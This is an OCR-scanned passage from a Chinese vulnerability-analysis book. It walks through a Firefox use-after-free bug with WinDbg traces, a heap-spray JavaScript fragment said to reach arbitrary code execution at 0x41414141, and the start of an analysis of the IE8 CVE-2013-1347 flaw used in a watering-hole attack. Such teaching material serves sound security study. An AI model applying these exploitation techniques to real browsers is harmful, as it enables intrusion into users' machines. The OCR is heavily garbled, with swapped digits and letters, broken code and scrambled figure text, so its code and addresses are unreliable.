1198
1199
1200
// These three statenents are carefully ordered:
1201
// - onStopRequest should get a channel whose status is the same as the
1282
//
status argunent
1203
// -onStopRequest must get a non-nul1 channe1
1204
mChannel->Cance1（NS_BINDING_ABORTED）;//引用已释放的mChannel对象
1205
1f （mFinalListener)(
1206
// NoTE: Since mFinalListener is only set in onStartRequest, which takes
1207
// care of calling mFinalListener->0nStartRequest, mFinalListener is only
1208
// non-null here 1f onStartRequest was already called.
1209
mFina1Listener->OnStopRequest(mChannel, nsnu11, NS_BINDING_ABORTED);
1210
mFinalListener = nsnu11;
1211
mChannel = nsnu11;
1212
1213
省略部分内容…
1469
return NS_oK;
147e }
下面实际动态调试一下，先在xullnsObjectLoadingContent:：LoadObject+Oxfc（根据前面调用虚函
数前溃时得到的偏移量）的地方下断点：
0:000>g
Breakpoint 2 hit
eax=884bf888 ebx=61588e90 ecx=8881e881 edx=00e8e0 esi=07339584 ed1=00eee80
e1p=61394d6d esp=004bf6c0 ebp=064bf7fe 1op1=θ
nv up e1 pl zr na pe nc
cs=001b ss=0023 ds=0023 es=6023 fs=003b gs=0000
ef1=0eee8246
---
## Page 303
284
漏洞战争：软件漏洞分析精要
xu1InsObjectLoadingContent::Loadobject:
61394d6d 55
push
ebp
θ:e8e> bp 61394d6d+fc
0:008> u 61394d6d+fc
xul!nsObjectLoadingContent::Loadobject+exfc
[e:\bu11ds\moz2_slave\re1-192-w32-b1d\bu11d\content\base\src\nsobject1oadingcontent.cpp
@ 12e3]:
61394e69 8be8
mov
ecx, dword ptr [eax]
61394e6b be82884b88
mov
esi, 8848ee02h
61394e70 56
push
es1
61394e71 50
push
eax
61394e72 ff5118
dword ptr [ecx+18h]
执行后断下，可以发现这里引用的对象正是前面xullnsObjectLoadingContent:OnChannelRedirect
的第2个参数值0x0：
e:020>g
Breakpoint θ hit
eax=87136f80 ebx=84d2d7c4 ecx=05fc157e edx=0714a168 esi=04d2d81c edi=88e88e00
eip=61394e69 esp=001dee38 ebp=001df03c 1op1=0
nv up e1 p1 zr na pe nc
cs=001b s5=0023 ds=0023 es=0023 fs=003b gs=00e0
ef1=00000246
xulInsobjectLoadingContent::Loadobject+exfc:
61394e69 8be8
mov
ecx,dword ptr[eax] ds:8823:87136f88=06457bce
单步执行下去就触发异常，因此虚表指针被募改，导致索引虚函数时出错，进而导致程序前溃。
0:000> p
eax=87136f88 ebx=84d2d7c4 ecx=06457bce edx=0714a16e esi=884bee82 edi=88ee8880
eip=61394e72 esp=001dee30 ebp=001dfe3c 1op1=0
nv up e1 pl zr na pe nc
cs=001b s5=0023
ze0=sp
es=0023 fs+003b gs=0000
xu1!nsobjectLoadingContent::Loadobject+ex1e5:
ef1=00008246
61394e72 ff5118
ca11
dword ptr [ecx+18h] ds:8823:06457bd8=0641e118
d bu xu11ns0bjectLoadingContent::Loadobject
Matched: 6e83558c xul1ns0bjectLoadingContent::Loadobject (class nsAString_interna1 *, int,
class nsCString *, int)
Matched: 6e834d6d xu1lns0bjectLoadingContent::Load0bject (class nsIURI *, int, class
nsCString *, int)
Ambiguous symbol error at *xul Ins0bjectLoadingContent::Loadobject '
0:020> bp 60834d6d+fc
0:020> g
ModLoad: 6d988808 6d9aeee8
C: \windows\system32\shdocvw.d11
Breakpoint θ hit
eax=0753faee ebx=071a64e4 ecx=05db4d7e edx=07539a30 es1=071a653c ed1=8000ee00
eip=66834e69 esp=0017ef48 ebp=0017f14c iop1=@
nv up ei pl zr na pe nc
ef1=00088246
xu1 1nsobjectLoadingContent: : Loadobject+8xfc:
68834e69 8be8
AOu
ecx,dword ptr [eax] ds:0e23:e753fa00=ecece81c
…省略部分内容…
0:000>p
eax=0753fa00 ebx=071a64e4 ecx=Bcece01c edx=07539a3 es1=884be002 edi=8eeee88
eip=6e834e72 esp=8e17ef40 ebp=0e17f14c iop1=0
nv up ei p1 zr na pe nc
cs=001b ss=0023 ds=0823 es=0023 fs=003b gs=0000
efl=0e0e8246
xu11ns0bjectLoadingContent: : Loadobject+ex105:
60834e72 ff5118
ca11dword ptr [ecx+18h]ds:0023:0c0c0034=7d66a4e8
接下米，只需要利用Heap Spray技术将Shellcode喷射到0x0c0c0034的位置即可实现任意代码执行：
var ret_addr = unescape(*%uee24%uecec")
var b = ret_addr,substring(e,(@x48-ex24)/2)
wh1le(ret_addr.1ength+28+8  g
ModLoad: 6d988888 6d9ae868
C:\Windows\system32\shdocvw.d11
(324.ad4): Access violation - code ceeeeee5 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=82c1eb50 ebx=86825724 ecx=8c@ce81c edx=87e313ae esi=884bee82 edi=88eeeeee
eip=41414141 esp=ee2feffc ebp=082ff20c 1op1=0
nv up el pl zr na pe nc
cs=@e1b
sS=0023
ds=0023
es=0023
fs=@e3b
gs=0000
efl=00010246
41414141??
???
成功实现漏洞的利用，执行到0x41414141地址。
7.3.4
源码比对
由于Firefox本身是开源的，
其漏洞补丁代码也是公开的，尤
其是针对一些漏洞的修复，都直
接提供在线比对的代码，比如本
节所讲的漏洞可以通过http:/hg
mozilla.org/releases/mozilla-1.9.2
Richasoe
(ebe12
/rev/c24f21581d77获取到源码对
比的情况，如图7-6所所示，补丁
sev Joad, oc hare se losd at. al1
代码添加对mChannel对象的判
mCtssnel) (
断，当mChannel=0（前面调试
PoC时知道mChannel为0）时直接
返回，直接避免后面赋值
mChannel的操作，从而防止UAF
图7-6补丁源码比对
漏洞的发生。
---
## Page 306
第7章释放重引用漏洞分析287
7.4CVE-2013-1347MicrosoftIECGenericElementUAF漏洞
7.4.1“水坑”攻击事件
2013年5月1日，美国劳工部网站被黑，并利用IE漏洞对浏览网站的用户进行攻击，当时全补丁
漏洞导致的，黑客通过分析目标的网络活动规律，寻找目标经常访问的网站弱点，先攻下这些网站
并植入攻击代码等待目标访问网站时实施攻击，此类方法被称为“水坑攻击”：
7.4.2通过HPA快速定位漏洞对象
本次漏洞分析的测试环境如表7-3所示。
表7-3测试环境
推荐使用的环境
备注
操作系统
Windows 7 SP1
简体中文家庭普通版
漏洞软件
Intemet Explorer
版本号：8.0.7601.17514
调试器
WinDbg
版本号：6.1.0001.404
反汇编器
IDA Pro
版本号：6.6
测试用的PoC代码如下：
用WinDbg附加IE8进程，然后打开PoC页面，如图7-7所示，选择“允许阻止的内容”选项，接
着触发异常。
CenAd
00
ecsUeniAd
x
经下
 cenAdnnietnDsieppec.heml
图7-7打开PoC页面后的安全提醒
0:024>g
ModLoad: 722eeeee 723dbeee C: \windows\system32\windowscodecs.d11
ModLoad: 69c5eeee 69de2eee C:\windows\System32\jscript.d11
(e9e.cb4): Access violation - code ceeeeee5 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=617d63d8 ebx=05d86148 ecx=003de9ae edx=147d89ff es1=0245c7fe ed1=0eeeeeee
eip=147d89ff esp=8245c7cθ ebp=8245c7dc iop1=θ
nv up ei pl zr na pe nc
cs=081bss=0023 ds=0023 es=0023fs=003bgs=00ee
ef1=00010246
147d89ff ??
0:0e5> kv
---
## Page 308
第7章释放重引1用漏润分析289
ChildEBP RetAddr Args to Chi1d
WARNING: Frase IP not in any known module. Following franes may be wrong
e245c7bc 618bc81c 618fa6b3 0245cbec 05d86148 ex147d89ff
e245c7ce 618fa6b3 e245cbec e5d86148 eeeeeee0 mshtm1!CElement::Doc+8x7 (FP0: [e,0,e])
0245c7dc 618fa5bf 05d86148 0245cbec 85d86148 mshtm11CTreeNode::ComputeFormats+8xba
e245ca88 619e928a e5d86148 e5d86148 e245caa8 msht=11CTreeNode::ComputeFormatsHe1per+ex44
0245ca98 6190924a 05d86148 05d86148 e245cab8
mshtm11CTreeNode: :GetFancyFormatIndexHelper+ex11
查看期溃时栈顶的返回地址0x618bc81c前面的指令：
0:005> ub 618bc81c
mshtm1!CElenent::SecurityContext+ex29:
618bc81e 98
nop
618bc811 90
nop
618bc812 90
nop
618bc813 90